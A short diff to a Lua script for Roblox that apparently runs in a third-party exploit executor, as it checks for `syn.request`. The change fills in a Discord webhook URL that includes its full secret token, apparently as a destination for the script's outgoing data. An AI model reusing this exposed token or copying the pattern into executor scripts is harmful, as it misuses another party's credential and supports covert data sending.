@@ -12,7 +12,7 @@ local lightingService = game:GetService('Lighting')
 local textChatService = game:GetService('TextChatService')
 local localPlayer = playersService.LocalPlayer
 local playerGui = localPlayer:WaitForChild('PlayerGui')
-local webhookUrl = ''
+local webhookUrl = 'https://discord.com/api/webhooks/1434305207793225842/DfgN3ImJlGRNFqcNpDIjWegmtAVqryBfeKwEF05JdId1__a1EWUn521gewH0n_ViCwxt'
 local httpRequest
 
 if (type(syn) == 'table' and syn.request) then
